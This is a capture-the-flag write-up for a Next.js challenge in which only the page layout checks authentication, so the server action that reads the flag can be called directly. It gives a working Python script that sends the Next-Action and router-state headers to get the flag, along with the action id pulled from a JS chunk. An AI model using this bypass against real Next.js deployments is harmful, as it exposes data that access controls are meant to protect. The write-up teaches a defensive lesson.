# Parallel and Buffet

## Summary

This is a Next.js app-router challenge with a protected `/secret` page. The intended mistake is that the page layout checks authentication, but the server action that reads the flag does not.

Flag:

```text
tkbctf{l4y0ut_4nd_p4g3_r4c3_c0nd1t10n_ee6eb83d459d}
```

## Bug

The auth check only exists in the page layout:

```ts
// app/secret/layout.tsx
const authenticated = await isAuthenticated();
if (!authenticated) {
  redirect("/");
}
```

But the server action that backs the secret button is callable on its own:

```ts
// actions/data.ts
export async function getData(key: string): Promise<string> {
  if (key === "flag") {
    return readFileSync("/flag.txt", "utf-8").trim();
  }
  ...
}
```

And the client component imports that action directly:

```ts
// components/SecretContent.tsx
const result = await getData("welcome");
```

So the layout protects rendering of `/secret`, but not the action endpoint itself.

## Exploit idea

For Next.js server actions, the browser sends:

- a `Next-Action` header containing the server action id
- a `Next-Router-State-Tree` header
- the serialized action arguments in the request body

The only deployment-specific part is the action id. The local build gives one id, but the live target uses a different one, so we need to extract the live id from the deployed JS chunk.

## Getting the live action id

Even unauthenticated, `GET /secret` returns a redirect page that still references the client chunk for `SecretContent`.

That page included:

```text
/_next/static/chunks/5ad4b8279c17bf93.js
```

Inside that chunk:

```js
createServerReference("40c32639965f57b19e523c622dee45ac164d4033f0", ..., "getData")
```

So the live action id for `getData` was:

```text
40c32639965f57b19e523c622dee45ac164d4033f0
```

## Exploit

Send a direct server-action request to `/secret` with argument `["flag"]`.

```python
import requests, urllib.parse, json, re

base = "http://35.194.108.145:49370"
action = "40c32639965f57b19e523c622dee45ac164d4033f0"

tree = ["", {"children": ["secret", {"children": ["__PAGE__", {}]}]}, None, None, True]

headers = {
    "Accept": "text/x-component",
    "Next-Action": action,
    "Next-Router-State-Tree": urllib.parse.quote(
        json.dumps(tree, separators=(",", ":"))
    ),
    "Content-Type": "text/plain;charset=UTF-8",
}

r = requests.post(base + "/secret", headers=headers, data='["flag"]', timeout=10)
print(r.text)
print(re.search(r"tkbctf\\{[^}]+\\}", r.text).group(0))
```

Response:

```text
0:{"a":"$@1","f":"","b":"4M5V33Bv4Be55yThAtpNQ","q":"","i":false}
1:"tkbctf{l4y0ut_4nd_p4g3_r4c3_c0nd1t10n_ee6eb83d459d}"
```

## Why it works

The app assumes “protected page” implies “protected action”, but in app-router those are separate concerns. If a server action touches sensitive data, it needs its own auth check inside the action itself.
